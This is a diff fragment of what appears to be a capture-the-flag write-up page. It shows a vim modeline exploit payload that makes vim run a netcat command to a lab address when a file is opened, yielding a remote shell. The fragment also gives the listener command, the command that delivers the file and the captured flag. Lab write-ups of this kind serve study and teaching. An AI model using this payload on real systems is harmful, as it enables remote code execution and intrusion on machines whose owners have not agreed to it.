@@ -114,7 +114,7 @@ if (!doNotTrack) {
 <pre><code>:!nc 172.30.0.14 3333||&quot; vi:fen:fdm=expr:fde=assert_fails(&quot;source\!\ \%&quot;):fdl=0:fdt=&quot;
 </code></pre><p>The reason why this line gets executed is because this exploit uses vim modlines, a &ldquo;feature [that] allows to specify custom editor options near the start or end of a file.&rdquo;</p>
 <p>So, having set a nc listener (<code>nc -lvvp 3333</code>) in one window, we send the exploit file through nc:</p>
-<pre><code>cat exploit.txt | nc 172.30.0.2
+<pre><code>cat exploit.txt | nc 172.30.0.2 4321
 </code></pre><p>and terminate the process (Control+C). Coming back to the listener, we have a shell as user <code>mwazowski</code> and we can read the flag:</p>
 <pre><code>cat flag.txt
 gigem{ca7_1s7_t0_mak3_suRe}
